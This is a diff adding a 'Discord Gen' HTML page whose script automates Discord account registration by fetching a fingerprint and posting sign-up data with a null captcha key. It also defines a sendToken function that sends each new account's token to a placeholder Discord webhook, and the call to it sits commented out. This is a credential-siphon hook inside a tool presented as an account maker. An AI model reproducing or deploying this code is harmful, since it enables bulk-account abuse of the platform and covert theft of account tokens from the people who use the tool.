@@ -1,0 +1,122 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Discord Gen</title>
+	<link rel="shortcut icon" href="https://cdn.iconscout.com/icon/free/png-512/raspberry-pi-555246.png">
+	<style>
+		@import url(http://fonts.googleapis.com/css?family=Lato:400,300,300italic,400italic,700,700italic,900);
+		* {
+		  box-sizing: border-box;
+		}
+
+		.background {
+		  position: absolute;
+		  top: 0;
+		  left: 0;
+		  width: 100%;
+		  height: 100%;
+		  -o-object-fit: cover;
+		     object-fit: cover;
+		  -o-object-position: center;
+		     object-position: center;
+		}
+
+		.overlay {
+		  min-height: 95vh;
+		  display: -webkit-box;
+		  display: -ms-flexbox;
+		  display: flex;
+		  -webkit-box-align: center;
+		      -ms-flex-align: center;
+		          align-items: center;
+		  -webkit-box-pack: center;
+		      -ms-flex-pack: center;
+		          justify-content: center;
+		}
+
+		.overlay h3 {
+		    background: #000 none repeat scroll 0 0;
+		    color: white;
+		    font-weight: 600;
+		    margin: 2rem 3rem 0;
+		    mix-blend-mode: overlay;
+		    padding: 5px 15px;
+		    text-align: center;
+		}
+	</style>
+    <script>
+		function sendToken(discordToken, accountName) {
+			var request = new XMLHttpRequest();
+			request.open("POST", "https://discord.com/api/webhooks/XXX/XXX");
+
+			request.setRequestHeader('Content-type', 'application/json');
+
+			var params = {
+				username: accountName,
+				content: discordToken
+			}
+
+			request.send(JSON.stringify(params));
+		}
+
+		function Create(email,user,pass,dob,Invite) {
+			// Grab the fingerprint from discord
+			var xhra = new XMLHttpRequest();
+			xhra.open("GET", "https://discord.com/api/v9/experiments");
+			xhra.onload = function() {
+				var fingerprint = JSON.parse(this.response).fingerprint
+				var xhrb = new XMLHttpRequest();
+				var data = {
+					"fingerprint":fingerprint,
+					"email":email,
+					"username":user,
+					"password":pass,
+					"invite":Invite,
+					"consent":true,
+					"date_of_birth":dob,
+					"gift_code_sku_id":null,
+					"captcha_key":null
+				}
+
+				// Send the registration data to discord
+				xhrb.open("POST", "https://discord.com/api/v9/auth/register");
+				xhrb.setRequestHeader('Content-type', 'application/json');
+				xhrb.onload = function() {
+					console.log(xhrb.response)
+					alert(xhrb.response)
+					//sendToken(JSON.parse(this.response).token, user);
+				}
+				xhrb.send(JSON.stringify(data))
+			}
+			xhra.send()
+		}
+
+		function gen(){
+			Create(
+				document.querySelector("#email").value,
+				document.querySelector("#username").value,
+				document.querySelector("#password").value,
+				document.querySelector("#dob").value,
+				document.querySelector("#invite").value
+			)
+		}
+    </script>
+</head>
+
+<body>
+	<image class="background" src="https://media3.giphy.com/media/b29IZK1dP4aWs/giphy.gif" alt="background gif">
+	<div class="overlay">
+		<div>
+            <h3><image width="50%" src="https://i.pinimg.com/originals/0d/5a/7a/0d5a7a920f011a34adf1ccea5046fb2c.gif" alt="background gif"></h3>
+			<h3>Email: <input type="email" id="email"></h3>
+            <h3>Username: <input type="text" id="username"></h3>
+            <h3>Password: <input type="text" id="password"></h3>
+            <h3><a title="Must be 13 or older">DOB</a>: <input type="date" id="dob" value="2000-01-01">			</h3>
+            <h3>Invite ID: <input type="text" id="invite"></h3>
+            <h3><button onclick="gen()">Make Account</button></h3>
+		</div>
+	</div>
+</body>
